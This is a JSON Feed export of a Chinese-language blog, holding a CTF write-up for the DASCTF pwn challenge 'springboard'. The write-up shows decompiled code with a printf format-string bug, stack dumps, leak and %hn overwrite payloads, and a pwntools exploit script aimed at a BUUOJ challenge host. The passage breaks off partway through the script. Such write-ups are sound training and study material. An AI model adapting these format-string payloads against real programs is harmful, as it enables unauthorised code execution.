{
    "version": "https://jsonfeed.org/version/1",
    "title": "null • All posts by \"复现\" category",
    "description": "欢迎来到Huan的笔记空间~~~~~~🌸",
    "home_page_url": "https://yhuanhuan01.github.io",
    "items": [
        {
            "id": "https://yhuanhuan01.github.io/2024/07/22/0720-DASCTF-pwn/",
            "url": "https://yhuanhuan01.github.io/2024/07/22/0720-DASCTF-pwn/",
            "title": "0720_DASCTF_pwn",
            "date_published": "2024-07-21T23:52:04.000Z",
            "content_html": "<h1 id=\"0720_dasctf_pwn\"><a class=\"markdownIt-Anchor\" href=\"#0720_dasctf_pwn\">#</a> 0720_DASCTF_pwn</h1>\n<h3 id=\"springboard\"><a class=\"markdownIt-Anchor\" href=\"#springboard\">#</a> springboard</h3>\n<blockquote>\n<p>考察非栈上格式化字符串</p>\n</blockquote>\n<pre><code>Arch: amd64-64-little\nRELRO: Partial RELRO\nStack: No canary found\nNX: NX enabled\nPIE: No PIE (0x3fe000)\n该程序是动态连接的\n该程序有符号表可用\n</code></pre>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> __cdecl <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>argv<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>envp<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">int</span> i<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+Ch] [rbp-4h]</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token function\">myinit</span><span class=\"token punctuation\">(</span>argc<span class=\"token punctuation\">,</span> argv<span class=\"token punctuation\">,</span> envp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Life is not boring, dreams are not out of reach.\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Sometimes you just need a springboard.\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Then you can see a wider world.\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"There may be setbacks along the way.\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"But keep your love of life alive.\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"I believe that you will succeed.\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Good luck.\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token function\">putchar</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Here's a simple pwn question, challenge yourself.\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;=</span> <span class=\"token number\">4</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>i <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"You have an 5 chances to get a flag\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"This is the %d time\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>i <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Please enter a keyword\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> bss<span class=\"token punctuation\">,</span> <span class=\"token number\">0x40uLL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span>bss<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>总体来讲，代码逻辑还是比较简单，漏洞也非常的明显。签到题实锤了确实</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;=</span> <span class=\"token number\">4</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>i <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> bss<span class=\"token punctuation\">,</span> <span class=\"token number\">0x40uLL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span>bss<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>5 次机会，第一次不用多想泄露地址</p>\n<blockquote>\n<p>00:0000│ rsp 0x7fffffffdcd0  —▸ 0x7fffffffddc0 ◂— 0x1<br>\n01:0008│        0x7fffffffdcd8 ◂— 0x0<br>\n02:0010│ rbp 0x7fffffffdce0  —▸ 0x400840 ( <code>__libc_csu_init</code> ) ◂— 0x41ff894156415741<br>\n03:0018│        0x7fffffffdce8  —▸ 0x7ffff7820840 ( <code>__libc_start_main</code> +240) ◂— 0x31000197f9e8c789<br>\n04:0020│        0x7fffffffdcf0 ◂— 0x1<br>\n05:0028│        0x7fffffffdcf8  —▸ 0x7fffffffddc8 —▸ 0x7fffffffe163 ◂— 0x4853006e77702f2e /* ‘./pwn’ */</p>\n</blockquote>\n<p>stack_addr：  <code>00:0000│ rsp 0x7fffffffdcd0  —▸ 0x7fffffffddc0 ◂— 0x1</code>   ——&gt;  <code>%6$p</code></p>\n<p>libc_addr:     <code>0x7fffffffdce8  —▸ 0x7ffff7820840 (__libc_start_main+240) ◂— ..</code> ——&gt;  <code>%9$p</code></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>pl <span class=\"token operator\">=</span> <span class=\"token string\">b'%6$p-%9$p'</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>sla<span class=\"token punctuation\">(</span><span class=\"token string\">b'Please enter a keyword\\n'</span><span class=\"token punctuation\">,</span>pl<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>ru<span class=\"token punctuation\">(</span><span class=\"token string\">\"0x\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>stack <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>rc<span class=\"token punctuation\">(</span><span class=\"token number\">12</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#0x7fffffffddc0 - 0x7fffffffdce8</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>ru<span class=\"token punctuation\">(</span><span class=\"token string\">\"-0x\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>libcbase <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>rc<span class=\"token punctuation\">(</span><span class=\"token number\">12</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">240</span> <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>system <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">]</span> </pre></td></tr><tr><td data-num=\"8\"></td><td><pre>lg<span class=\"token punctuation\">(</span><span class=\"token string\">'stack'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>lg<span class=\"token punctuation\">(</span><span class=\"token string\">'libcbase'</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>得到两个地址之后，就是用诸葛连弩打非栈上格式化字符。</p>\n<p><code>ret_addr : 0x7fffffffdce8</code></p>\n<p>用格式化字符串将其改成 ogg_addr 即可</p>\n<blockquote>\n<p>pwndbg&gt; stack 40<br>\n00:0000│ rsp 0x7fffffffdcd0 —▸ 0x7fffffffddc0 ◂— 0x1<br>\n01:0008│     0x7fffffffdcd8 ◂— 0x100000000<br>\n02:0010│ rbp 0x7fffffffdce0 —▸ 0x400840 (__libc_csu_init) ◂— 0x41ff894156415741<br>\n03:0018│     0x7fffffffdce8 —▸ 0x7ffff7820840 (__libc_start_main+240) ◂— 0x31000197f9e8c789<br>\n04:0020│     0x7fffffffdcf0 ◂— 0x1<br>\n05:0028│     0x7fffffffdcf8 —▸ 0x7fffffffddc8 —▸ 0x7fffffffe163 ◂— 0x4853006e77702f2e /* ‘./pwn’ <em>/<br>\n06:0030│     0x7fffffffdd00 ◂— 0x1f7e25ca0<br>\n07:0038│     0x7fffffffdd08 —▸ 0x400767 (main) ◂— 0x10ec8348e5894855<br>\n08:0040│     0x7fffffffdd10 ◂— 0x0<br>\n09:0048│     0x7fffffffdd18 ◂— 0x63d45a5b7410892e<br>\n0a:0050│     0x7fffffffdd20 —▸ 0x400610 (_start) ◂— 0x89485ed18949ed31<br>\n0b:0058│     0x7fffffffdd28 —▸ 0x7fffffffddc0 ◂— 0x1<br>\n0c:0060│     0x7fffffffdd30 ◂— 0x0<br>\n0d:0068│     0x7fffffffdd38 ◂— 0x0<br>\n0e:0070│     0x7fffffffdd40 ◂— 0x9c2ba524dd70892e<br>\n0f:0078│     0x7fffffffdd48 ◂— 0x9c2bb5df6b60892e<br>\n10:0080│     0x7fffffffdd50 ◂— 0x0<br>\n… ↓        2 skipped<br>\n13:0098│     0x7fffffffdd68 —▸ 0x7fffffffddd8 —▸ 0x7fffffffe169 ◂— ‘SHELL=/bin/bash’<br>\n14:00a0│     0x7fffffffdd70 —▸ 0x7ffff7e27168 ◂— 0x0<br>\n15:00a8│     0x7fffffffdd78 —▸ 0x7ffff7c1080b ◂— 0xc48348001f0fd3eb<br>\n16:00b0│     0x7fffffffdd80 ◂— 0x0<br>\n17:00b8│     0x7fffffffdd88 ◂— 0x0<br>\n18:00c0│     0x7fffffffdd90 —▸ 0x400610 (_start) ◂— 0x89485ed18949ed31<br>\n19:00c8│     0x7fffffffdd98 —▸ 0x7fffffffddc0 ◂— 0x1<br>\n1a:00d0│     0x7fffffffdda0 ◂— 0x0<br>\n1b:00d8│     0x7fffffffdda8 —▸ 0x400639 (_start+41) ◂— 0xb80000441f0f66f4<br>\n1c:00e0│     0x7fffffffddb0 —▸ 0x7fffffffddb8 ◂— 0x1c<br>\n1d:00e8│     0x7fffffffddb8 ◂— 0x1c<br>\n1e:00f0│ r13 0x7fffffffddc0 ◂— 0x1<br>\n1f:00f8│     0x7fffffffddc8 —▸ 0x7fffffffe163 ◂— 0x4853006e77702f2e /</em> ‘./pwn’ */<br>\n20:0100│     0x7fffffffddd0 ◂— 0x0<br>\n21:0108│     0x7fffffffddd8 —▸ 0x7fffffffe169 ◂— ‘SHELL=/bin/bash’<br>\n22:0110│     0x7fffffffdde0 —▸ 0x7fffffffe179 ◂— ‘SESSION_MANAGER=local/h711:@/tmp/.ICE-unix/2518,unix/h711:/tmp/.ICE-unix/2518’<br>\n23:0118│     0x7fffffffdde8 —▸ 0x7fffffffe1c7 ◂— ‘QT_ACCESSIBILITY=1’<br>\n24:0120│     0x7fffffffddf0 —▸ 0x7fffffffe1da ◂— ‘COLORTERM=truecolor’<br>\n25:0128│     0x7fffffffddf8 —▸ 0x7fffffffe1ee ◂— ‘XDG_CONFIG_DIRS=/etc/xdg/xdg-ubuntu-xorg:/etc/xdg’<br>\n26:0130│     0x7fffffffde00 —▸ 0x7fffffffe220 ◂— ‘SSH_AGENT_LAUNCHER=gnome-keyring’<br>\n27:0138│     0x7fffffffde08 —▸ 0x7fffffffe241 ◂— ‘XDG_MENU_PREFIX=gnome-’</p>\n</blockquote>\n<p>在 %11$p 处，我们修改 <code>0x7fffffffe163 </code> 低 2 字节修改成返回地址 <code>0xdce8</code></p>\n<blockquote>\n<p>05:0028│     0x7fffffffdcf8 —▸ 0x7fffffffddc8 —▸ 0x7fffffffe163 ◂— 0x4853006e77702f2e /* ‘./pwn’ */</p>\n</blockquote>\n<p>这样 <code>0x7fffffffddc8</code>  在 %37$p 处，就会指向返回地址。接着我们修改 %37 处即可</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>sla<span class=\"token punctuation\">(</span><span class=\"token string\">'Please enter a keyword\\n'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'%'</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>stack1<span class=\"token operator\">&amp;</span><span class=\"token number\">0xffff</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">'c%11$hn'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>input1 <span class=\"token operator\">=</span> stack1<span class=\"token operator\">&amp;</span><span class=\"token number\">0xffff</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>input2 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>stack1<span class=\"token operator\">+</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span><span class=\"token number\">0xffff</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>sla<span class=\"token punctuation\">(</span><span class=\"token string\">'Please enter a keyword\\n'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'%'</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>og<span class=\"token operator\">&amp;</span><span class=\"token number\">0xffff</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">'c%37$hn'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>sla<span class=\"token punctuation\">(</span><span class=\"token string\">'Please enter a keyword\\n'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'%'</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>stack1<span class=\"token operator\">+</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span><span class=\"token number\">0xffff</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">'c%11$hn'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>sla<span class=\"token punctuation\">(</span><span class=\"token string\">'Please enter a keyword\\n'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'%'</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>og<span class=\"token operator\">>></span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span><span class=\"token number\">0xff</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">'c%37$hhn'</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h4 id=\"exp\"><a class=\"markdownIt-Anchor\" href=\"#exp\">#</a> EXP</h4>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>huan_attack_pwn</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>'''</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">import</span> sys</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\"># from LibcSearcher import *</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\"># from ctypes import *</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\"># context(arch='i386' , os='linux', log_level='debug')</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>binary <span class=\"token operator\">=</span> <span class=\"token string\">'./pwn'</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>libc <span class=\"token operator\">=</span> <span class=\"token string\">'./libc.so.6'</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>host<span class=\"token punctuation\">,</span> port <span class=\"token operator\">=</span> <span class=\"token string\">\"node5.buuoj.cn:28082\"</span><span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token string\">'\\033[31;40mremote\\033[0m: (y)\\n'</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token string\">'\\033[32;40mprocess\\033[0m: (n)'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">if</span> sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token string\">'y'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    r <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>port<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    r <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token comment\"># r = gdb.debug(binary)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token comment\"># libc = cdll.LoadLibrary(libc)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>libc<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token comment\"># srand = libc.srand (libc.time (0)) #设置种子</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>default <span class=\"token operator\">=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>se      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>sa      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data              <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>sl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>sla     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data              <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>rc      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> numb<span class=\"token operator\">=</span><span class=\"token number\">4096</span>                <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>numb<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>rl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> time<span class=\"token operator\">=</span>default             <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span>timeout<span class=\"token operator\">=</span>time<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>ru      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims<span class=\"token punctuation\">,</span> time<span class=\"token operator\">=</span>default     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">,</span>timeout<span class=\"token operator\">=</span>time<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>rpu     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims<span class=\"token punctuation\">,</span> time<span class=\"token operator\">=</span>default     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">,</span>timeout<span class=\"token operator\">=</span>time<span class=\"token punctuation\">,</span>drop<span class=\"token operator\">=</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>uu32    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> u32<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>uu64    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> u64<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>lic     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> uu64<span class=\"token punctuation\">(</span>ru<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>padding <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> length                   <span class=\"token punctuation\">:</span> <span class=\"token string\">b'Yhuan'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>length <span class=\"token operator\">//</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'Y'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>length <span class=\"token operator\">%</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>lg      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> var_name                 <span class=\"token punctuation\">:</span> log<span class=\"token punctuation\">.</span>success<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>var_name<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\"> ：0x</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token builtin\">globals</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span>var_name<span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span><span class=\"token format-spec\">x</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>prl     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> var_name                 <span class=\"token punctuation\">:</span> <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>var_name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>debug   <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> command<span class=\"token operator\">=</span><span class=\"token string\">''</span>               <span class=\"token punctuation\">:</span> gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">,</span>command<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>it      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                          <span class=\"token punctuation\">:</span> r<span class=\"token 